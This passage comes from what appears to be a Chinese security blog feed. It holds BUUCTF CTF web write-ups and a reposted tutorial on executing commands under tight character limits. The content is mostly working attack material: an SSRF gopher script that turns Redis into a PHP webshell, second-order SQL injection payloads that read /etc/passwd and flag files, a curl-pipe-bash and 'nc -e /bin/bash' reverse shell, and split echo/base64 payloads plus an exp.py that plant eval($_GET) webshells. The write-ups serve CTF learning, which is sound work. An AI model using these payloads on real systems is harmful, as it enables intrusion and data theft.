</span><br><span class="line">          RX bytes:2927 (2.9 KB)  TX bytes:2927 (2.9 KB)</span><br></pre></td></tr></table></figure><p>得知有srrf漏洞，file://协议被过滤了，用发现file协议被过滤了，我们可以尝试绕过：file：/、file:&lt;空格&gt;///</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url=file:/var/www/html/index.php</span><br><span class="line">?url=file:%20///var/www/html/index.php</span><br></pre></td></tr></table></figure><p>得知index.php漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">echo</span> curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="comment">//echo $url."\n";</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is'</span>, $url,$match))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//var_dump($match);</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">'鍒繖鏍�'</span>);</span><br><span class="line">&#125;</span><br><span class="line">curl($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'secret'</span>]))&#123;</span><br><span class="line">system(<span class="string">'ifconfig'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>bp跑一下 10.55.109.9 c 段主机，<br><img src="../../images/ctf/buuctf/26.jpg" alt=""><br>跑一下 10.55.109.11的端口，或直接试一试常见的端口6379/3306<br>后面就直接写shell   </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import urllib</span><br><span class="line">protocol=<span class="string">"gopher://"</span></span><br><span class="line">ip=<span class="string">"10.55.109.11"</span></span><br><span class="line">port=<span class="string">"6379"</span></span><br><span class="line">shell=<span class="string">"\n\n&lt;?php system('cat /flag');?&gt;\n\n"</span></span><br><span class="line">filename=<span class="string">"shell.php"</span></span><br><span class="line">path=<span class="string">"/var/www/html"</span></span><br><span class="line">passwd=<span class="string">""</span></span><br><span class="line">cmd=[<span class="string">"flushall"</span>,</span><br><span class="line">     <span class="string">"set 1 &#123;&#125;"</span>.format(shell.replace(<span class="string">" "</span>,<span class="string">"<span class="variable">$&#123;IFS&#125;</span>"</span>)),</span><br><span class="line">     <span class="string">"config set dir &#123;&#125;"</span>.format(path),</span><br><span class="line">     <span class="string">"config set dbfilename &#123;&#125;"</span>.format(filename),</span><br><span class="line">     <span class="string">"save"</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(0,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line">def redis_format(arr):</span><br><span class="line">    CRLF=<span class="string">"\r\n"</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">    cmd=<span class="string">""</span></span><br><span class="line">    cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">"$"</span>+str(len((x.replace(<span class="string">"<span class="variable">$&#123;IFS&#125;</span>"</span>,<span class="string">" "</span>))))+CRLF+x.replace(<span class="string">"<span class="variable">$&#123;IFS&#125;</span>"</span>,<span class="string">" "</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="built_in">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.request.quote(redis_format(x))</span><br><span class="line">    <span class="built_in">print</span>(urllib.request.quote(payload))    <span class="comment"># 由于我们这里是GET，所以要进行两次url编码</span></span><br></pre></td></tr></table></figure><p>在访问，即可得flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://10.55.109.11:80/shell.php</span><br></pre></td></tr></table></figure><h1 id="BJDCTF-2nd-elementmaster"><a href="#BJDCTF-2nd-elementmaster" class="headerlink" title="[BJDCTF 2nd]elementmaster"></a>[BJDCTF 2nd]elementmaster</h1><p>506F2E706870 hextotext得到Po.php<br>结果是And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php，进去就能得到flag</p><h1 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h1><p>已经提示用户名和密码了，弱密码登录（得自己去爆破）<br>zhangwei666即可<br>.git泄露，Git_Extract恢复一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"mysql.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>] != <span class="string">'yes'</span>)&#123;</span><br><span class="line">    header(<span class="string">"Location: ./login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do'</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">'do'</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'write'</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">'category'</span>]);</span><br><span class="line">    $title = addslashes($_POST[<span class="string">'title'</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into board</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                title = '$title',</span></span><br><span class="line"><span class="string">                content = '$content'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'comment'</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">'bo_id'</span>]);</span><br><span class="line">    $sql = <span class="string">"select category from board where id='$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">'category'</span>];</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                content = '$content',</span></span><br><span class="line"><span class="string">                bo_id = '$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">"Location: ./comment.php?id=$bo_id"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以发现当do=write的时候，传入的信息都会进行转义，但是数据库会自动清除反斜杠，<br>当do=comment的时候，可以发现直接从category这个字段进行查询，这就导致了二次注入<br>所以说那个转义函数根本起不到防护的作用。<br>要在第一步的时候插入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">category=1’,content=user(),/*</span><br></pre></td></tr></table></figure><p>在第二步的时候留言</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=*/<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>这样插入数据库中的留言就会变成</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">insert into comment</span><br><span class="line">            <span class="built_in">set</span> category = <span class="string">'1'</span>,content=user(),/*</span><br><span class="line">                content = <span class="string">'*/#'</span>,</span><br><span class="line">                bo_id = <span class="string">'$bo_id'</span></span><br></pre></td></tr></table></figure><p>这里注意一下 <code>#</code> 注释一行 <code>/**/</code>注释多行   </p><p>看到是 root 用户，一般 flag 就不会在数据库里面(因为如果在数据库中，不需要这么高的权限，实际也确实没有)，应该是要用 SQL语句 读取flag文件了。</p><p>首先读取 /etc/passwd 看看服务器上有哪些用户，payload为: 1’,content=(select load_file(‘/etc/passwd’)),/*<br>发现 www 用户的一些操作。看见有 .DS_Store 文件，考虑到目标环境是docker，所以 .DS_Store 文件应该在 /tmp 中。而 .DS_Store 文件中，经常会有一些不可键字符，所以我们可以使用hex函数对其内容进行转换，payload为： ‘,content=(select hex(load_file(‘/tmp/html/.DS_Store’))),/*<br>得知flag文件名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">',content=(select hex(load_file('</span>/var/www/html/flag_8946e1ff1ee3e40f.php<span class="string">'))),/*</span></span><br></pre></td></tr></table></figure><h1 id="BJDCTF-2nd-duangShell"><a href="#BJDCTF-2nd-duangShell" class="headerlink" title="[BJDCTF 2nd]duangShell"></a>[BJDCTF 2nd]duangShell</h1><p>vim编辑一个文件产生的临时文件，处理不当有可能造成泄露。其泄露方式为<br>文件名.swp 有些时候文件名前会有一个点.。然后获得这个.swp文件后，在Linux里通过命令 vim -r xxx.swp 来让临时文件恢复正常</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"how can i give you source code? .swp?!"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'girl_friend'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"where is P3rh4ps's girl friend ???"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    &#123;    $girl = $_POST[<span class="string">'girl_friend'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\&gt;|\\\/'</span>, $girl))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'just girl'</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">'/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i'</span>, $girl)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src='img/p3_need_beautiful_gf.png'&gt; &lt;!-- He is p3 --&gt;"</span>;    </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;   exec($girl);        <span class="comment">//duangShell~~~~    </span></span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本题的RCE绕过<br>poc1：通过 curl url获得某个网址的某个文件的内容，再通过管道符转移给bash处理,如:<br>curl url/shell.txt|bash shell.txt里是要执行的命令，本题建议在shell.txt里放反弹shell指令<br>poc2:<br>监听命令<br>攻击机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp port</span><br></pre></td></tr></table></figure><p>靶机上执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc vpsip port -e /bin/bash</span><br></pre></td></tr></table></figure><p>用find / -name flag 寻找flag </p><h1 id="BJDCTF-2nd-Schrödinger"><a href="#BJDCTF-2nd-Schrödinger" class="headerlink" title="[BJDCTF 2nd]Schrödinger"></a>[BJDCTF 2nd]Schrödinger</h1><p>应该是输入文件，对其进行check后删除，正好符合前面提示要求的删除的test.php<br>输入</p><p><a href="http://5612956a-2228-4ed1-99ae-3039a69fa7d1.node3.buuoj.cn/test.php" target="_blank" rel="noopener">http://5612956a-2228-4ed1-99ae-3039a69fa7d1.node3.buuoj.cn/test.php</a></p><p>点击input，发现页面发生了变化<br>点击check并抓包<br>看到有base64编码，解码后发现是时间戳，将其修改为0，然后Forward<br>b站视频的av号，去翻一下评论即可得到flag</p><h1 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h1><p>查看源码发现最底下有个提示，说明可能存在文件包含    </p><p>用filter伪协议读出所有可以找到的页面和文件的源码，整理一下， 开始分析可能存在的漏洞  </p><p>confirm.php存储 address 字段的值，change.php 又拿出来使用，导致 二次注入  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('</span>/flag.txt<span class="string">'),1,20)),0x7e),1)#</span></span><br><span class="line"><span class="string">1'</span> <span class="built_in">where</span> user_id=updatexml(1,concat(0x7e,(select substr(load_file(<span class="string">'/flag.txt'</span>),21,40)),0x7e),1)<span class="comment">#</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;BUUCTF是一个ctf平台,里面都是一些经典赛题。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>有限字符下的命令执行</title>
    <link href="https://blog.cfyqy.com/article/141bd5ee.html"/>
    <id>https://blog.cfyqy.com/article/141bd5ee.html</id>
    <published>2020-12-28T15:37:15.000Z</published>
    <updated>2021-01-05T03:10:44.315Z</updated>
    
    <content type="html"><![CDATA[<p>命令执行的字符限制绕过  </p><a id="more"></a><p>转载 <a href="http://purplet.top/2020/12/28/%E6%9C%89%E9%99%90%E5%AD%97%E7%AC%A6%E4%B8%8B%E7%9A%84%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">CTF相关知识点<br>有限字符下的任意命令执行总结</a></p><h1 id="15位可控字符"><a href="#15位可控字符" class="headerlink" title="15位可控字符"></a>15位可控字符</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">15</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> strlen($_GET[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">'too long'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为只能传入14个字符，但是没有限制命令执行的次数，所以我们的思想可以通过Linux下的&gt;符号与&gt;&gt;符号写入一段一句话木马到指定文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(</span><br><span class="line">$_GET</span><br><span class="line">[<span class="number">1</span>]</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>经测试上述这样的一句话木马（经过换行）是可以命令执行的，所以我们可以通过传参构造出这样的一句话木马，不断传入以下Payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> \<span class="meta">&lt;?php</span>&gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">eval</span>\(&gt;&gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">echo</span> \$_GET&gt;&gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">echo</span> \[<span class="number">1</span>\]&gt;&gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">echo</span> \)\;&gt;&gt;<span class="number">1</span></span><br><span class="line">mv <span class="number">1</span> <span class="number">1.</span>php</span><br></pre></td></tr></table></figure><h1 id="7位可控字符"><a href="#7位可控字符" class="headerlink" title="7位可控字符"></a>7位可控字符</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>]&lt;=<span class="number">7</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> strlen($_GET[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;hr/&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">'too long'</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>知识点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;a       <span class="comment">#虽然没有输入但是会创建a这个文件</span></span><br><span class="line">ls -t     <span class="comment">#ls基于基于事件排序（从晚到早）</span></span><br><span class="line">sh a     <span class="comment">#sh会把a里面的每行内容当作命令来执行</span></span><br><span class="line">使用\进行命令拼接  <span class="comment">#l\ s = ls</span></span><br><span class="line">base64 <span class="comment">#使用base64编码避免特殊字符</span></span><br></pre></td></tr></table></figure><p>目标，写入语句<code>“&lt;?php eval($_GET[1]);”</code>，base64编码后“PD9waHAgZXZhbCgkX0dFVFsxXSk7”</p><p>需要被执行的语句是：“echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php”<br>payload.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&gt;hp</span><br><span class="line">&gt;1.p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\ -\\</span><br><span class="line">&gt;e64\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;7\|\\</span><br><span class="line">&gt;XSk\\</span><br><span class="line">&gt;Fsx\\</span><br><span class="line">&gt;dFV\\</span><br><span class="line">&gt;kX0\\</span><br><span class="line">&gt;bCg\\</span><br><span class="line">&gt;XZh\\</span><br><span class="line">&gt;AgZ\\</span><br><span class="line">&gt;waH\\</span><br><span class="line">&gt;PD9\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br><span class="line">ls -t&gt;0</span><br><span class="line">sh 0</span><br></pre></td></tr></table></figure><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">target_url=<span class="string">"http://192.168.1.101"</span></span><br><span class="line">url = target_url+<span class="string">"/command.php?1=&#123;&#125;"</span></span><br><span class="line">print(<span class="string">"[+]start attack!!!"</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"payload.txt"</span>,<span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        print(<span class="string">"[*]"</span> + url.format(i.strip()))</span><br><span class="line">        requests.get(url.format(i.strip()))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#检查是否攻击成功</span></span><br><span class="line">test = requests.get(target_url+<span class="string">"/1.php"</span>)</span><br><span class="line"><span class="keyword">if</span> test.status_code == requests.codes.ok:</span><br><span class="line">    print(<span class="string">"[*]Attack success!!!"</span>)</span><br></pre></td></tr></table></figure><p>攻击完后生成1.php</p><h1 id="5位可控字符"><a href="#5位可控字符" class="headerlink" title="5位可控字符"></a>5位可控字符</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">'/var/www/html/sandbox/'</span> . md5(<span class="string">"orange"</span> . <span class="variable">$_SERVER</span>[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    @<span class="built_in">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'cmd'</span>]) &amp;&amp; strlen(<span class="variable">$_GET</span>[<span class="string">'cmd'</span>]) &lt;= 5) &#123;</span><br><span class="line">        @<span class="built_in">exec</span>(<span class="variable">$_GET</span>[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @<span class="built_in">exec</span>(<span class="string">'/bin/rm -rf '</span> . <span class="variable">$sandbox</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>知识点：</p><ul><li>输入通配符 * ，Linux会把第一个列出的文件名当作命令，剩下的文件名当作参数</li><li>通过rev来倒置输出内容（rev命令将文件中的每行内容以字符为单位反序输出）</li><li>用dir来代替ls不换行输出；rev将文件内容反向输出；在用ls时，写到a时每个文件名都是单独一行</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;rev</span><br><span class="line"><span class="built_in">echo</span> 1234 &gt; v</span><br><span class="line">*v （等同于命令：rev v</span><br></pre></td></tr></table></figure><p>两种利用方式：</p><ul><li>反弹shell: 一种是curl服务起上写好的文件，进行反弹Shell，</li><li>写马：写入一句话木马</li></ul><p>详细的解释参看<a href="https://www.freesion.com/article/8743881775/" target="_blank" rel="noopener">https://www.freesion.com/article/8743881775/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span><span class="variable">$&#123;IFS&#125;</span>PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 ‐d&gt;1.php</span><br></pre></td></tr></table></figure><p>那么我们只需要将上面的代码拆分倒序输入到主机即可。我们需要让sh先执行a文件（ls -th &gt;f）就会得到f文件，最后再让sh去执行f文件即可得到1.php。最终payload如下<br>payload.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;a</span><br><span class="line">&gt;hp</span><br><span class="line">&gt;p\\</span><br><span class="line">&gt;1.\\</span><br><span class="line">&gt;\&gt;\\</span><br><span class="line">&gt;-d\\</span><br><span class="line">&gt;\ 